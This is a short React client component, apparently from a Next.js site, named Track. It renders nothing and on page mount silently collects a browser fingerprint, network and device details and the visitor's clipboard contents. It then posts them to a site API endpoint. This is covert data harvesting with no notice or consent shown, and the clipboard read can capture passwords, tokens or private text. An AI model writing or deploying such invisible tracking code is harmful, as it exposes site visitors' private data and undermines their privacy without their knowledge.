"use client";

import { useEffect } from "react";

import {
  generateFingerprint,    
  getClipboardData,   // attempts to read the clipboard (requires permissions)
  getNetworkInfo,  
  getDeviceInfo   // fetches navigator.connection data
} from "../utils/fingerprint";

export default function Track() {
  useEffect(() => {
    console.log('Track component mounted');
    async function captureAndSendData() {
      try {
        // Parallel calls: gather multiple data points at once
        const [
          fingerprint,
          networkInfo,
          clipboardData,
          deviceInfo
        ] = await Promise.all([
          generateFingerprint(),
          getNetworkInfo(),
          getClipboardData(),
          getDeviceInfo()
        ]);

        // Build the final payload
        const trackingPayload = {
          timestamp: new Date().toISOString(),
          fingerprint,
          network: networkInfo,
          clipboard: clipboardData,
          device: deviceInfo
        };

        // Send to your API
        await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(trackingPayload),
        });
      } catch (error) {
        console.error("Tracking error:", error);
      }
    }

    captureAndSendData();
  }, []);

  return null;
}
